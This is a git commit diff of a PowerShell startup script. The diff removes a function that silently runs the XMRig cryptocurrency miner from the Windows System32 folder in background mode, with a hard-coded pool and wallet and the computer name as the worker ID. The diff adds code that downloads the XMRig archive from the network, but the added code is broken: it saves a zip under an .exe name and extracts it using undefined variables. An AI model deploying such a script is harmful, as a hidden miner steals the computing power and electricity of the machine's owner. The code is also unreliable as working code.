caf75318b3868171db53600390c2fa31d2c7cbf2
Lê Bình Phương <69758987+BinhPhuongIT@users.noreply.github.com>
2023-11-25 23:02:46 +0700

    Update startup.ps1

--- startup.ps1
+++ startup.ps1
@@ -1,32 +1,13 @@
-$filePath = "C:\Windows\System32\xmrig.exe"
-
-function Run-XMRig {
-    Set-Location $PSScriptRoot
-    
-    $donateLevel = 1
-    
-    $xmrigPath = Join-Path $PSScriptRoot $filePath
-    
-    $xmrigParams = @{
-        'donate-level' = $donateLevel
-        'o' = 'sg.zephyr.herominers.com:1123'
-        'u' = 'ZEPHs7fstwgccjL2tHvyKKHqhJ42Zw5cY1WzzH4Fk8zs6kaXQ8LCTUeLWNe5iC52YtfPdRoizrs9ccp8Ef3zhQLyXdCvxyox4SJ'
-        'p' = $env:COMPUTERNAME
-        'a' = 'rx/0'
-        'k' = $true
-        'B' = $true
-    }
-    
-    $xmrigCommand = "$xmrigPath $($xmrigParams.GetEnumerator() | ForEach-Object { "--$($_.Key) $($_.Value)" })"
-    
-    Start-Process -FilePath "powershell" -ArgumentList $xmrigCommand -Wait
-}
+$filePath = "C:\programdata\xmrig-6.21.0-msvc-win64\xmrig-6.21.0\xmrig.exe"
 
 if (-not (Test-Path $filePath)) {
-    $url = "https://raw.githubusercontent.com/BinhPhuongIT/xmrig-customs/main/xmrig.exe"
+    $url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip"
     Invoke-WebRequest -Uri $url -OutFile $filePath
 
-    Run-XMRig
+    Expand-Archive -Path $zipFilePath -DestinationPath $extractPath
+
 } else {
-    Run-XMRig
+    echo "File da ton tai"
 }
+
+
